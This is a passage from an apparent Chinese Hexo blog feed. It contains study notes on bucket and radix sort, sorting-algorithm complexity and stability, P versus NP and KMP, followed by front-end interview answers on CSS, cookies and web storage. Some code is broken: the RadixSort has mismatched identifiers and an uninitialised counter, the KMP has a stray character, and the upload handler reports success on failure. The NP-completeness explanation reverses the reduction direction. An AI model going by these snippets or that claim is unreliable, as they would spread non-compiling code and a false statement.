MergeSort_recursive(ElemType *r, ElemType *rf, int n) </span><br><span class="line">&#123; <span class="comment">/*对顺序表*p 作归并排序*/</span> </span><br><span class="line">    MSort(r, rf,<span class="number">0</span>, n<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="桶排序-基数排序-Radix-Sort"><a href="#桶排序-基数排序-Radix-Sort" class="headerlink" title="桶排序/基数排序(Radix Sort)"></a>桶排序/基数排序(Radix Sort)</h2><p>###桶排序</p><p>####基本思想<br>是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。</p><p>简单来说，就是把数据分组，放在一个个的桶中，然后对每个桶里面的在进行排序。</p><p>例如要对大小为[1..1000]范围内的n个整数A[1..n]排序</p><p>首先，可以把桶设为大小为10的范围，具体而言，设集合B[1]存储[1..10]的整数，集合B[2]存储 (10..20]的整数，……集合B[i]存储( (i-1)<em>10, i</em>10]的整数，i = 1,2,..100。总共有 100个桶。</p><p>然后，对A[1..n]从头到尾扫描一遍，把每个A[i]放入对应的桶B[j]中。 再对这100个桶中每个桶里的数字排序，这时可用冒泡，选择，乃至快排，一般来说任 何排序法都可以。</p><p>最后，依次输出每个桶里面的数字，且每个桶中的数字从小到大输出，这 样就得到所有数字排好序的一个序列了。</p><p>假设有n个数字，有m个桶，如果数字是平均分布的，则每个桶里面平均有n/m个数字。如果对每个桶中的数字采用快速排序，那么整个算法的复杂度是 O(n + m <em> n/m</em>log(n/m)) = O(n + nlogn - nlogm) 从上式看出，当m接近n的时候，桶排序复杂度接近O(n)</p><p>当然，以上复杂度的计算是基于输入的n个数字是平均分布这个假设的。这个假设是很强的 ，实际应用中效果并没有这么好。如果所有的数字都落在同一个桶中，那就退化成一般的排序了。</p><p>前面说的几大排序算法 ，大部分时间复杂度都是O（n2），也有部分排序算法时间复杂度是O(nlogn)。而桶式排序却能实现O（n）的时间复杂度。</p><p>但桶排序的缺点是：</p><p>1）首先是空间复杂度比较高，需要的额外开销大。排序有两个数组的空间开销，一个存放待排序数组，一个就是所谓的桶，比如待排序值是从0到m-1，那就需要m个桶，这个桶数组就要至少m个空间。</p><p>2）其次待排序的元素都要在一定的范围内等等。</p><p>桶式排序是一种分配排序。分配排序的特定是不需要进行关键码的比较，但前提是要知道待排序列的一些具体情况。</p><p>分配排序的基本思想：说白了就是进行多次的桶式排序。</p><p>基数排序过程无须比较关键字，而是通过“分配”和“收集”过程来实现排序。它们的时间复杂度可达到线性阶：O(n)。</p><p>实例:</p><p>扑克牌中52 张牌，可按花色和面值分成两个字段，其大小关系为：<br> &lt;%asset_img tong_sort_1.png%&gt;<br>若对扑克牌按花色、面值进行升序排序，得到如下序列：<br> &lt;%asset_img tong_sort_2.png%&gt;</p><p>即两张牌，若花色不同，不论面值怎样，花色低的那张牌小于花色高的，只有在同花色情况下，大小关系才由面值的大小确定。这就是多关键码排序。</p><p>为得到排序结果，我们讨论两种排序方法。</p><p>方法1：先对花色排序，将其分为4 个组，即梅花组、方块组、红心组、黑心组。再对每个组分别按面值进行排序，最后，将4 个组连接起来即可。</p><p>方法2：先按13 个面值给出13 个编号组(2 号，3 号，…，A 号)，将牌按面值依次放入对应的编号组，分成13 堆。再按花色给出4 个编号组(梅花、方块、红心、黑心)，将2号组中牌取出分别放入对应花色组，再将3 号组中牌取出分别放入对应花色组，……，这样，4 个花色组中均按面值有序，然后，将4 个花色组依次连接起来即可。</p><p>设n 个元素的待排序列包含d 个关键码{k1，k2，…，kd}，则称序列对关键码{k1，k2，…，kd}有序是指：对于序列中任两个记录r[i]和r<a href="1≤i≤j≤n">j</a>都满足下列有序关系：</p><p>其中k1 称为最主位关键码，kd 称为最次位关键码 。</p><h4 id="两种多关键码排序方法："><a href="#两种多关键码排序方法：" class="headerlink" title="两种多关键码排序方法："></a>两种多关键码排序方法：</h4><p>多关键码排序按照从最主位关键码到最次位关键码或从最次位到最主位关键码的顺序逐次排序，分两种方法：</p><p>最高位优先(Most Significant Digit first)法，简称MSD 法：</p><p>1）先按k1 排序分组，将序列分成若干子序列，同一组序列的记录中，关键码k1 相等。</p><p>2）再对各组按k2 排序分成子组，之后，对后面的关键码继续这样的排序分组，直到按最次位关键码kd 对各子组排序后。</p><p>3）再将各组连接起来，便得到一个有序序列。扑克牌按花色、面值排序中介绍的方法一即是MSD 法。</p><p>最低位优先(Least Significant Digit first)法，简称LSD 法：</p><p>1) 先从kd 开始排序，再对kd-1进行排序，依次重复，直到按k1排序分组分成最小的子序列后。</p><p>2) 最后将各个子序列连接起来，便可得到一个有序的序列, 扑克牌按花色、面值排序中介绍的方法二即是LSD 法。</p><h4 id="基于LSD方法的链式基数排序的基本思想"><a href="#基于LSD方法的链式基数排序的基本思想" class="headerlink" title="基于LSD方法的链式基数排序的基本思想"></a>基于LSD方法的链式基数排序的基本思想</h4><p>“多关键字排序”的思想实现“单关键字排序”。对数字型或字符型的单关键字，可以看作由多个数位或多个字符构成的多关键字，此时可以采用“分配-收集”的方法进行排序，这一过程称作基数排序法，其中每个数字或字符可能的取值个数称为基数。比如，扑克牌的花色基数为4，面值基数为13。在整理扑克牌时，既可以先按花色整理，也可以先按面值整理。按花色整理时，先按红、黑、方、花的顺序分成4摞（分配），再按此顺序再叠放在一起（收集），然后按面值的顺序分成13摞（分配），再按此顺序叠放在一起（收集），如此进行二次分配和收集即可将扑克牌排列有序。</p><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序:"></a>基数排序:</h2><p>是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。</p><h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Void RadixSort(Node L[],length,maxradix) </span><br><span class="line">&#123; </span><br><span class="line">    int m,n,k,lsp; </span><br><span class="line">    k=<span class="number">1</span>;m=<span class="number">1</span>; </span><br><span class="line">    int temp[<span class="number">10</span>][length<span class="number">-1</span>]; </span><br><span class="line">    Empty(temp); <span class="comment">//清空临时空间 </span></span><br><span class="line">    <span class="keyword">while</span>(k&lt;maxradix) <span class="comment">//遍历所有关键字 </span></span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;length;i++) <span class="comment">//分配过程 </span></span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(L[i]&lt;m) Temp[<span class="number">0</span>][n]=L[i]; </span><br><span class="line">            <span class="keyword">else</span> Lsp=(L[i]/m)%<span class="number">10</span>; <span class="comment">//确定关键字 </span></span><br><span class="line">            Temp[lsp][n]=L[i]; </span><br><span class="line">            n++; </span><br><span class="line">        &#125; </span><br><span class="line">        CollectElement(L,Temp); <span class="comment">//收集 </span></span><br><span class="line">        n=<span class="number">0</span>; </span><br><span class="line">        m=m*<span class="number">10</span>; </span><br><span class="line">        k++; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> &lt;%aset_img all_sort.png%&gt;</p><p>各种排序的稳定性，时间复杂度和空间复杂度总结：</p><h4 id="时间复杂度来说："><a href="#时间复杂度来说：" class="headerlink" title="时间复杂度来说："></a>时间复杂度来说：</h4><p>(1)平方阶(O(n2))排序<br>各类简单排序:直接插入、直接选择和冒泡排序；</p><p>(2)线性对数阶(O(nlog2n))排序<br>快速排序、堆排序和归并排序；</p><p>(3)O(n1+§))排序,§是介于0和1之间的常数。<br>希尔排序</p><p>(4)线性阶(O(n))排序<br>基数排序，此外还有桶、箱排序。</p><p>说明：</p><p>当原表有序或基本有序时，直接插入排序和冒泡排序将大大减少比较次数和移动记录的次数，时间复杂度可降至O（n）；</p><p>而快速排序则相反，当原表基本有序时，将蜕化为冒泡排序，时间复杂度提高为O（n2）；</p><p>原表是否有序，对简单选择排序、堆排序、归并排序和基数排序的时间复杂度影响不大。</p><h4 id="稳定性："><a href="#稳定性：" class="headerlink" title="稳定性："></a>稳定性：</h4><p>排序算法的稳定性:若待排序的序列中，存在多个具有相同关键字的记录，经过排序， 这些记录的相对次序保持不变，则称该算法是稳定的；若经排序后，记录的相对 次序发生了改变，则称该算法是不稳定的。</p><p>稳定性的好处：排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，第一个键排序的结果可以为第二个键排序所用。基数排序就是这样，先按低位排序，逐次按高位排序，低位相同的元素其顺序再高位也相同时是不会改变的。另外，如果排序算法稳定，可以避免多余的比较；</p><p><strong>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序</strong></p><p><strong>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序</strong></p><h4 id="选择排序算法准则："><a href="#选择排序算法准则：" class="headerlink" title="选择排序算法准则："></a>选择排序算法准则：</h4><p>每种排序算法都各有优缺点。因此，在实用时需根据不同情况适当选用，甚至可以将多种方法结合起来使用。</p><p>选择排序算法的依据</p><p>影响排序的因素有很多，平均时间复杂度低的算法并不一定就是最优的。相反，有时平均时间复杂度高的算法可能更适合某些特殊情况。同时，选择算法时还得考虑它的可读性，以利于软件的维护。一般而言，需要考虑的因素有以下四点：</p><p>1.待排序的记录数目n的大小；<br>2.记录本身数据量的大小，也就是记录中除关键字外的其他信息量的大小；<br>3.关键字的结构及其分布情况；<br>4.对排序稳定性的要求。</p><p>设待排序元素的个数为n.</p><p>1）当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。<br>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；<br>堆排序：如果内存空间允许且要求稳定性的，<br>归并排序：它有一定数量的数据移动，所以我们可能过与插入排序组合，先获得一定长度的序列，然后再合并，在效率上将有所提高。</p><p>2）当n较大，内存空间允许，且要求稳定性 =》归并排序</p><p>3）当n较小，可采用直接插入或直接选择排序。<br>直接插入排序：当元素分布有序，直接插入排序将大大减少比较次数和移动记录的次数。<br>直接选择排序：元素分布有序，如果不要求稳定性，选择直接选择排序</p><p>5）一般不使用或不直接使用传统的冒泡排序。</p><p>6）基数排序<br>它是一种稳定的排序算法，但有一定的局限性：</p><p>1、关键字可分解。<br>2、记录的关键字位数较少，如果密集更好<br>3、如果是数字时，最好是无符号的，否则将增加相应的映射复杂度，可先将其正负分开排序。</p><h2 id="P问题"><a href="#P问题" class="headerlink" title="P问题"></a>P问题</h2><pre><code>P是一个判定问题类,这些问题可以用一个确定性算法在多项式时间内判定或解出。如果一个判定性问题的复杂度是该问题的一个实例的规模n的多项式函数，则我们说这种可以在多项式时间内解决的判定性问题属于P类问题。P类问题就是所有复杂度为多项式时间的问题的集合。NP是一个判定问题类,这些问题可以用一个确定算法在多项式时间内检查或验证出它们的解;P事实上很直观,我们通常在编程中求解的问题大多都是P类问题.比如说排序,找最短路径等.2、NP问题 然而有些问题很难找到多项式时间的算法（或许根本不存在），比如找出无向图中的哈米尔顿回路问题，但是我们发现如果给了我们该问题的一个答案，我们可以在多项式时间内判断这个答案是否正确。比如说对于哈米尔顿回路问题，给一个任意的回路，我们很容易判断他是否是哈米尔顿回路（只要看是不是所有的顶点都在回路中就可以了）。这种可以在多项式时间内验证一个解是否正确的问题称为NP问题。显然，所有的P类问题都是属于NP问题的，但是现在的问题是，P是否等于NP?这个问题至今还未解决。NP这个类事实上也很有趣,它并不要求给出一个算法来求解问题本身,而只是要求给出一个确定性算法在多项式时间内验证它的解.3、NP完全问题 此外请注意，NP问题不一定都是难解的问题，比如，简单的数组排序问题是P类问题，但是P属于NP，所以也是NP问题，你能说他很难解么？刚才说了，现在还不知道是否有P=NP或者P&lt;&gt;NP，但是后来人们发现还有一系列的特殊NP问题，这类问题的特殊性质使得很多人相信P&lt;&gt;NP，只不过现在还无法证明。这类特殊的NP问题就是NP完全问题（NPC问题，C代表complete）。 NP完全问题是求NP中判定问题的一个子类.NPC问题存在着一个令人惊讶的性质，即如果一个NPC问题存在多项式时间的算法，则所有的NP问题都可以在多项式时间内求解，即P=NP成立！！这是因为，每一个NPC问题可以在多项式时间内转化成任何一个NP问题。比如前面说的哈米尔顿回路问题就是一个NPC问题。NPC问题的历史并不久，cook在1971年找到了第一个NPC问题，此后人们又陆续发现很多NPC问题，现在可能已经有3000多个了。所以，我们一般认为NPC问题是难解的问题，因为他不太可能存在一个多项式时间的算法（如果存在则所有的NP问题都存在多项式时间算法，这太不可思议了，但是也不是不可能）。类似哈米尔顿回路/路径问题，货郎担问题，集团问题，最小边覆盖问题（注意和路径覆盖的区别），等等很多问题都是NPC问题，所以都是难解的问题。</code></pre><h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><p>手算KMP匹配的Next值和Nextval值<a href="https://www.slyar.com/blog/kmp-next-nextval.html" target="_blank" rel="noopener">https://www.slyar.com/blog/kmp-next-nextval.html</a><br><a href="http://blog.csdn.net/yutianzuijin/article/details/11954939" target="_blank" rel="noopener">http://blog.csdn.net/yutianzuijin/article/details</a></p><p>字符串f每一个位置的最大公共长度。这个最大公共长度在算法导论里面被记为next数组。假设我们现在已经求得next[1]、next[2]、……next[i]，分别表示长度为1到i的字符串的前缀和后缀最大公共长度，现在要求next[i+1]。由上图我们可以看到，<br>1、如果位置i和位置next[i]处的两个字符相同（下标从零开始），则next[i+1]等于next[i]加1<br>2、如果两个位置的字符不相同，我们可以将长度为next[i]的字符串继续分割，获得其最大公共长度next[next[i]]，然后再和位置i的字符比较。如果位置next[next[i]]和位置i的字符相同，则next[i+1]就等于next[next[i]]加1。如果不相等，就可以继续分割长度为next[next[i]]的字符串，直到字符串长度为0为止<br> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> getNext(char*t)</span><br><span class="line">&#123;</span><br><span class="line">    int i=<span class="number">0</span>;</span><br><span class="line">    int j=<span class="number">-1</span>;</span><br><span class="line">    next[i]=<span class="number">-1</span>;</span><br><span class="line">    int lent=strlen(t);</span><br><span class="line">    <span class="keyword">while</span>(i&lt;lent)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||t[i]==t[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i]=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int kmp(char*s,char*t)&#123;</span><br><span class="line">    int lens=strlen(s);</span><br><span class="line">    int lent=strlen(t);</span><br><span class="line">    getNext (t);</span><br><span class="line">    int i=<span class="number">-1</span>,j=<span class="number">-1</span>;</span><br><span class="line">    int cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;lens)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||t[j]==s[i]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 如果第i+1个位置不同，则出现不匹配，我们依旧要将长度为j的字符串分割，获得其最大公共长度next[j]，然后从next[j]继续比较两个字符串</span></span><br><span class="line">        <span class="keyword">else</span> j=next[j];。</span><br><span class="line">        <span class="keyword">if</span>(j==lent)&#123;</span><br><span class="line">            j--;</span><br><span class="line">            i--;</span><br><span class="line">            j=next[j];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;<span class="comment">//s中有cnt 个t子串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; &amp;lt;%asset_img 8-sort.png%&amp;gt;&lt;/p&gt;
&lt;p&gt;当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。&lt;/p&gt;
&lt;p&gt;快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="面试" scheme="http://lry1994.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试题摘录</title>
    <link href="http://lry1994.github.io/study/Comprehensive/interview.html"/>
    <id>http://lry1994.github.io/study/Comprehensive/interview.html</id>
    <published>2018-05-04T16:00:00.000Z</published>
    <updated>2018-10-08T01:17:29.430Z</updated>
    
    <content type="html"><![CDATA[<h3 id="vue数据双向绑定的原理"><a href="#vue数据双向绑定的原理" class="headerlink" title="vue数据双向绑定的原理"></a>vue数据双向绑定的原理</h3><p>主要讲了实现是基于Object.defineProperty<br>另外也大概阐述了<code>发布-订阅者模式</code>，主要是Observer，Dep，Watcher等</p><h3 id="JSONP可以用post请求吗？为什么？"><a href="#JSONP可以用post请求吗？为什么？" class="headerlink" title="JSONP可以用post请求吗？为什么？"></a>JSONP可以用post请求吗？为什么？</h3><p>不支持<br>因为script标签只支持get请求…</p><h3 id="描述一下css的盒模型"><a href="#描述一下css的盒模型" class="headerlink" title="描述一下css的盒模型"></a>描述一下css的盒模型</h3><p>标准盒模型和怪异模式</p><p>标准模式：box-sizing:content-box;</p><p>怪异模式：box-sizing:border-box;</p><h3 id="H5异步上传文件"><a href="#H5异步上传文件" class="headerlink" title="H5异步上传文件"></a>H5异步上传文件</h3><p>关键代码</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;input id=<span class="string">"uploadFile"</span> type=<span class="string">"file"</span> name=<span class="string">"myPhoto"</span> /&gt; </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">var</span> fd = <span class="keyword">new</span> FormData();<span class="comment">//新建FormData</span></span><br><span class="line"> fd.append(<span class="string">"myPhoto"</span>, $(<span class="string">"uploadFile"</span>).files[<span class="number">0</span>]);<span class="comment">//塞数据</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">//创建XMLHttpRequest 对象</span></span><br><span class="line"> xhr.open(<span class="string">"post"</span>,<span class="string">"/uploadPhoto.action"</span>, <span class="literal">true</span>);<span class="comment">//打开链接</span></span><br><span class="line"> xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">//监听</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> flag = xhr.responseText;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="string">"success"</span>) &#123;</span><br><span class="line">            alert(<span class="string">"图片上传成功！"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            alert(<span class="string">"图片上传成功！"</span>);</span><br><span class="line">        &#125;;                        </span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br><span class="line">xhr.send(fd);<span class="comment">//发送</span></span><br></pre></td></tr></table></figure><h3 id="实现垂直水平居中有哪些方法"><a href="#实现垂直水平居中有哪些方法" class="headerlink" title="实现垂直水平居中有哪些方法"></a>实现垂直水平居中有哪些方法</h3><ol><li><p>flexbox</p></li><li><p>绝对定位+margin负值(子容器宽高固定)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">childElement</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;                              </span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">400px</span>;           </span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;      </span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;                          </span><br><span class="line">    <span class="attribute">margin-top</span>:-<span class="number">100px</span>;<span class="comment">/*高度的一半*/</span></span><br><span class="line">    <span class="attribute">margin-left</span>:-<span class="number">200px</span>;<span class="comment">/*宽度的一半*/</span>                                         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>绝对定位top left right bottom 0 + margin auto (子容器宽高固定)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chilElement</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>绝对定位+transfrom负值（子容器宽高不知)</p></li></ol><p>（1） 不知道自己高度和父容器高度的情况下, 利用绝对定位只需要以下三行：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">parentElement</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">childElement</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-50%);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> （2）若父容器下只有一个元素，且父元素设置了高度，则只需要使用相对定位即可</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="selector-tag">parentElement</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>:xxx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">childElement</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="请你谈谈Cookie的弊端"><a href="#请你谈谈Cookie的弊端" class="headerlink" title="请你谈谈Cookie的弊端"></a>请你谈谈Cookie的弊端</h3><p>cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。<br>第一：每个特定的域名下最多生成20个cookie</p><ol><li>IE6或更低版本最多20个cookie</li><li>IE7和之后的版本最后可以有50个cookie。</li><li>Firefox最多50个cookie</li><li>chrome和Safari没有做硬性限制<br>IE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。</li></ol><p>cookie的最大大约为4096字节，为了兼容性，一般不能超过4095字节。</p><p>IE 提供了一种存储可以持久化用户数据，叫做<code>uerData</code>，从IE5.0就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在。</p><p>优点：极高的扩展性和可用性</p><ol><li>通过良好的编程，控制保存在cookie中的session对象的大小。</li><li>通过加密和安全传输技术（SSL），减少cookie被破解的可能性。</li><li>只在cookie中存放不敏感数据，即使被盗也不会有重大损失。</li><li>控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。</li></ol><p>缺点：</p><ol><li><p><code>Cookie</code>数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。</p></li><li><p>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</p></li><li><p>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p></li></ol><h3 id="web-storage和cookie的区别"><a href="#web-storage和cookie的区别" class="headerlink" title="web storage和cookie的区别"></a>web storage和cookie的区别</h3><p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p><p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p><p>但是Cookie也是不可以或缺的：Cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p><p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的UserData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p><p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等</p><h3 id="CSS中-link-和-import-的区别是？"><a href="#CSS中-link-和-import-的区别是？" class="headerlink" title="CSS中 link 和@import 的区别是？"></a>CSS中 link 和@import 的区别是？</h3><p>(1) link属于HTML标签，而@import是CSS提供的; </p><p>(2) 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;</p><p>(3) import只在IE5以上才能识别，而link是HTML标签，无兼容问题; </p><p>(4) link方式的样式的权重 高于@import的权重.</p><h3 id="对BFC规范的理解？"><a href="#对BFC规范的理解？" class="headerlink" title="对BFC规范的理解？"></a>对BFC规范的理解？</h3><p>BFC，块级格式化上下文，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个 BFC 中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的 margin 会发生折叠。</p><p>W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行布局，以及与其他元素的关系和相互作用。</p><h3 id="说说你对语义化的理解？"><a href="#说说你对语义化的理解？" class="headerlink" title="说说你对语义化的理解？"></a>说说你对语义化的理解？</h3><ol><li>去掉或者丢失样式的时候能够让页面呈现出清晰的结构</li><li>有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；</li><li>方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；</li><li>便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</li></ol><h3 id="清除浮动的技巧"><a 